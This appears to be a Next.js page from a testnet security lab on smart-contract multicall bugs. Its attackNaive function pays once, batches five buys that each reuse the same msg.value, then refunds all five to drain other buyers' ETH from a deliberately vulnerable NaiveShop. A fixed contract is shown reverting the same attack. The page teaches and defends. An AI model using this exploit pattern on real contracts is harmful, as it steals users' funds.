"use client";
import { useCallback, useEffect, useState } from "react";
import { type Abi, type Address, type Hex, encodeFunctionData } from "viem";
import { useWallet } from "@/components/Wallet";
import { DEPLOYMENT, txUrl } from "@/lib/config";
import { naiveAbi, shopAbi } from "@/lib/contracts";
import { publicClient } from "@/lib/client";
import { friendly } from "@/lib/errors";
import { eth } from "@/lib/format";

const ENTRIES = 5;

type Side = { name: string; address?: Address; abi: Abi; balance: bigint; minted: bigint; price: bigint };
type Result = { ok: boolean; lines: string[]; hashes: Hex[] };

async function sideState(name: string, address: Address | undefined, abi: Abi, naive: boolean): Promise<Side> {
  if (!address) return { name, abi, balance: 0n, minted: 0n, price: 0n };
  const [balance, minted, price] = await Promise.all([
    publicClient.getBalance({ address }),
    publicClient.readContract({ address, abi, functionName: "totalMinted" }) as Promise<bigint>,
    naive ? Promise.resolve(1_000_000_000_000_000n) : ((publicClient.readContract({ address, abi, functionName: "itemOf", args: [0n] }) as Promise<{ price: bigint }>).then((i) => i.price)),
  ]);
  return { name, address, abi, balance, minted, price };
}

export default function Lab() {
  const w = useWallet();
  const [naive, setNaive] = useState<Side>();
  const [till, setTill] = useState<Side>();
  const [res, setRes] = useState<Record<string, Result>>({});
  const [busy, setBusy] = useState<string | null>(null);

  const reload = useCallback(async () => {
    setNaive(await sideState("NaiveShop", DEPLOYMENT.naiveShop, naiveAbi, true));
    setTill(await sideState("Till Shop", DEPLOYMENT.labShop, shopAbi, false));
  }, []);
  useEffect(() => void reload(), [reload]);

  const batch = (abi: Abi) => encodeFunctionData({ abi, functionName: "multicall", args: [Array.from({ length: ENTRIES }, () => encodeFunctionData({ abi, functionName: "buy", args: [0n, 1n] }))] });

  const attackNaive = async () => {
    if (!naive?.address) return;
    setBusy("naive");
    const before = naive.balance;
    const first = naive.minted + 1n;
    const lines = [`Pay ${eth(naive.price)} ETH once, batch ${ENTRIES} buys of ${eth(naive.price)} ETH`];
    const h1 = await w.write("Attack: batched buys", { address: naive.address, abi: naiveAbi, functionName: "multicall", args: [(decodeArgs(batch(naiveAbi)))], value: naive.price });
    if (!h1) return setBusy(null);
    const refunds = Array.from({ length: ENTRIES }, (_, i) => encodeFunctionData({ abi: naiveAbi, functionName: "refund", args: [first + BigInt(i)] }));
    const h2 = await w.write(`Attack: refund ${ENTRIES} passes`, { address: naive.address, abi: naiveAbi, functionName: "multicall", args: [refunds] });
    const after = await publicClient.getBalance({ address: naive.address });
    lines.push(`Got ${ENTRIES} passes for one payment, refunded all ${ENTRIES}.`);
    lines.push(`Shop balance ${eth(before)} → ${eth(after)} ETH: ${eth(before - after)} ETH of other buyers' money is now yours.`);
    setRes((r) => ({ ...r, naive: { ok: !!h2, lines, hashes: [h1, ...(h2 ? [h2] : [])] } }));
    setBusy(null);
    void reload();
  };

  const attackTill = async () => {
    if (!till?.address || !w.address) return;
    setBusy("till");
    const lines = [`Pay ${eth(till.price)} ETH once, batch ${ENTRIES} buys of ${eth(till.price)} ETH`];
    try {
      await publicClient.simulateContract({ account: w.address, address: till.address, abi: shopAbi, functionName: "multicall", args: [decodeArgs(batch(shopAbi))], value: till.price });
      lines.push("Unexpected: the batch would succeed.");
      setRes((r) => ({ ...r, till: { ok: true, lines, hashes: [] } }));
    } catch (e) {
      const f = friendly(e);
      lines.push(`Reverted with ${f.code ?? "an error"}: ${f.title}.`);
      lines.push("Nothing was charged and no pass was minted.");
      setRes((r) => ({ ...r, till: { ok: false, lines, hashes: [] } }));
    }
    setBusy(null);
  };

  const sendAnyway = async () => {
    if (!till?.address) return;
    setBusy("till-raw");
    if (w.balance < till.price * 2n) await w.faucet({ silent: true });
    try {
      const r = await w.sendRaw(till.address, batch(shopAbi), till.price, 1_500_000n);
      setRes((x) => ({ ...x, till: { ok: false, lines: [...(x.till?.lines ?? []), `Sent on-chain anyway: ${r.status}. The value went back with the revert.`], hashes: [r.hash] } }));
    } catch (e) {
      setRes((x) => ({ ...x, till: { ok: false, lines: [...(x.till?.lines ?? []), friendly(e).title], hashes: [] } }));
    }
    setBusy(null);
    void reload();
  };

  if (!DEPLOYMENT.naiveShop || !DEPLOYMENT.labShop) return <p className="card">The lab contracts are not deployed on this network.</p>;

  return (
    <div className="space-y-5">
      <div>
        <p className="pill bg-alarm-500/10 text-alarm-600">Security demo · testnet only</p>
        <h1 className="mt-2 text-3xl font-black tracking-tight">The double-count, live</h1>
        <p className="mt-2 text-ink/70">
          Both contracts sell the same 0.001 ETH ticket and each holds 9 honest purchases. You play Mallory: pay once, batch {ENTRIES} buys with
          std&apos;s multicall, then refund. <code>NaiveShop</code> follows the std doc example (a <code>#[payable]</code> multicall next to handlers that
          trust <code>ctx.value()</code>); the Till shop draws every entry from one budget.
        </p>
      </div>
      <div className="grid gap-4 sm:grid-cols-2">
        {[
          { side: naive, key: "naive", run: attackNaive, tone: "border-alarm-500/40" },
          { side: till, key: "till", run: attackTill, tone: "border-till-500/40" },
        ].map(({ side, key, run, tone }) => (
          <section key={key} className={`card ${tone}`} data-testid={`lab-${key}`}>
            <h2 className="text-lg font-black">{side?.name ?? "…"}</h2>
            <dl className="mt-2 text-sm">
              <div className="flex justify-between"><dt className="text-ink/60">Contract balance</dt><dd className="font-mono" data-testid={`lab-${key}-balance`}>{side ? eth(side.balance) : "…"} ETH</dd></div>
              <div className="flex justify-between"><dt className="text-ink/60">Passes minted</dt><dd className="font-mono">{side?.minted.toString() ?? "…"}</dd></div>
            </dl>
            <button data-testid={`attack-${key}`} className={key === "naive" ? "btn-danger mt-3 w-full" : "btn-primary mt-3 w-full"} disabled={!!busy} onClick={() => void run()}>
              {busy === key ? "Running…" : `Run the attack on ${side?.name ?? ""}`}
            </button>
            {res[key] && (
              <div className="mt-3 space-y-1 rounded-xl bg-paper p-3 text-sm" data-testid={`lab-${key}-result`}>
                {res[key].lines.map((l, i) => <p key={i}>{l}</p>)}
                {res[key].hashes.map((h) => {
                  const u = txUrl(h);
                  return u ? <a key={h} href={u} className="block text-till-700 underline" target="_blank" rel="noreferrer">View {h.slice(0, 10)}…</a> : <p key={h} className="break-all font-mono text-xs text-ink/50">{h}</p>;
                })}
              </div>
            )}
            {key === "till" && res.till && !res.till.hashes.length && (
              <button className="btn-ghost mt-2 w-full text-sm" disabled={!!busy} onClick={() => void sendAnyway()}>Send it on-chain anyway (to see the reverted tx)</button>
            )}
          </section>
        ))}
      </div>
      <section className="card text-sm text-ink/70">
        <h2 className="font-bold text-ink">What happened</h2>
        <p className="mt-1">
          Every multicall entry is a <code>DELEGATECALL</code> that sees the batch&apos;s full <code>msg.value</code>. NaiveShop checks
          <code> msg.value == price</code> five times against the same payment. Till opens one budget of <code>msg.value</code> for the batch;
          the first buy draws it to zero and the second fails with <code>Overspend</code>.
        </p>
      </section>
    </div>
  );
}

/** multicall(bytes[]) args back out of the encoded call (so both sides share `batch`). */
function decodeArgs(data: Hex): Hex[] {
  const body = data.slice(10);
  const n = Number(BigInt(`0x${body.slice(64, 128)}`));
  const out: Hex[] = [];
  for (let i = 0; i < n; i++) {
    const off = Number(BigInt(`0x${body.slice(128 + i * 64, 192 + i * 64)}`)) * 2 + 128;
    const len = Number(BigInt(`0x${body.slice(off, off + 64)}`));
    out.push(`0x${body.slice(off + 64, off + 64 + len * 2)}` as Hex);
  }
  return out;
}
